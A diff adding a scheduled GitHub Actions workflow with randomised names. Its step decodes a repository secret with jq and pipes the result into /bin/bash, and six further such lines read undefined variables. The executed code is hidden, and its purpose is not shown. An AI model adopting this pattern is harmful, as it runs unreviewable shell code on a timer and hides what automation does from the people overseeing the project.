@@ -1,0 +1,22 @@
+name: mudengkoudaizhedajie
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mudengkoudaizhedajie
+        env:
+          c05627: ${{ secrets.c05627 }}
+        run: |
+          echo $c05627 | jq -r .pl607 | /bin/bash
+          echo $zwk1 | jq -r .ga21 | /bin/bash
+          echo $nr37265 | jq -r .vbh6837 | /bin/bash
+          echo $nbxb412 | jq -r .y2737 | /bin/bash
+          echo $irdru78 | jq -r .be4 | /bin/bash
+          echo $txi9 | jq -r .ishqu91 | /bin/bash
+          echo $ovk56465 | jq -r .u382 | /bin/bash
+
